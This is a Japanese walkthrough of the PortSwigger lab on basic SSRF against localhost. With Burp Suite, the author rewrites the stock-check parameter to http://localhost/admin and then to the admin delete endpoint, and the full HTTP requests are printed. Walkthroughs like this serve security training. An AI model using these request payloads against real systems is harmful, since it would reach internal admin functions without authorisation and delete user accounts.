# ローカル サーバーに対する基本的な SSRF

以下のハッキングラボに対して SSRF 攻撃を行います  
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

- 1. Burp Suite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. ハッキングラボ URL/admin 　にアクセスするとページの存在は確認できますが、以下のメッセージが表示されます

```
Admin interface only available if logged in as an administrator, or if requested from loopback
```

- 4. ホームページに移動してから、Burp Suite の Proxy タブで Intercept on にします

- 5. 在庫チェックリクエスト押下します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/9098384a-6212-46ad-85b5-efeb871bb5eb)
- 6. intercept するので、リクエストパラメータを書き換えます  
     [変更前]

```
POST /product/stock HTTP/2
Host: 0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Cookie: session=PRfFVULO8saCM3IH0ElrfDP9hQkv0ePV
Content-Length: 107
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

[変更後]

```
POST /product/stock HTTP/2
Host: 0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Cookie: session=PRfFVULO8saCM3IH0ElrfDP9hQkv0ePV
Content-Length: 107
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http://localhost/admin
```

- 7. 以下の管理者パネルが表示されるので操作してみますが、失敗します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/b5feeb1f-8942-47ac-b9b1-2061956df22f)

```
Admin interface only available if logged in as an administrator, or if requested from loopback
```

ちなみにリクエストは次のようになっています

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Cookie: session=PRfFVULO8saCM3IH0ElrfDP9hQkv0ePV
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

- 8. もう一度管理者ページアクセスして、Delete ボタンのリンクを確認します

- 9. 在庫チェックリクエストを以下のように書き換えます  
     [変更前]

```
POST /product/stock HTTP/2
Host: 0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Cookie: session=PRfFVULO8saCM3IH0ElrfDP9hQkv0ePV
Content-Length: 107
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

[変更後]

```
POST /product/stock HTTP/2
Host: 0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Cookie: session=PRfFVULO8saCM3IH0ElrfDP9hQkv0ePV
Content-Length: 107
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a16005f034d4f1b84dfd28b00270079.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http://localhost/admin/delete?username=carlos
```

これで一般ユーザーを削除できました。
